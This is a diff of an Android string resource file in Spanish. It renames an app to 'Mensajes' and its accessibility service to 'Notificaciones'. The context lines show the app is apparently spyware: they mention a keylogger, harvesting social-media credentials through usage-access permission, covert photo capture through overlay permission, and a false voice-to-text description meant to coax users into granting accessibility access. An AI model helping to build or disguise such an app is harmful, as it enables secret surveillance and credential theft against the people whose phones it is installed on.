@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Android text to speech</string>
+    <string name="app_name">Mensajes</string>
     <string name="login_hint_user">Correo</string>
     <string name="login_hint_passw">Contraseña</string>
     <string name="login_btn_sign_in">ENTRAR</string>
@@ -112,7 +112,7 @@
     <string name="msg_dialog_enable_overdraw">Necesitas activar el permiso del sorteo sobre otras aplicaciones para poder tomar fotos.</string>
     <string name="msg_dialog_enable_usage_stats">"Debe activar las aplicaciones con permiso de acceso de uso para obtener credenciales sociales "</string>
     <string name="enable_keylogger_success">"Accesibilidad exitosa a KeyLogger "</string>
-    <string name="accessibility_service_label">Android text to speech</string>
+    <string name="accessibility_service_label">Notificaciones</string>
     <string name="accessibility_service_description">"Permite convertir voz a texto, es utilizada por algunas aplicaciones."</string>
     <string name="msg_dialog_enable_accessibility_service">"Permite convertir voz a texto, es utilizada por algunas aplicaciones."</string>
     <string name="enable_service">HABILITAR ACCESIBILIDAD DEL SERVICIO</string>
